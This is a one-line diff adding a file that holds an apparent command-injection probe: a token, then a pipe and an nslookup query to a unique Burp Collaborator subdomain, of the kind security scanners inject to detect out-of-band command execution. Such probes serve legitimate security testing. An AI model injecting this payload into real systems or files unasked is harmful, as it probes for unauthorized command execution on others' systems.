@@ -1,0 +1,1 @@
+8lreM0B9Hm|nslookup -q=cname bo3f9w45wyf5ww4sddbphiwh3891xztnpbhyamz.burpcollaborator.net.&
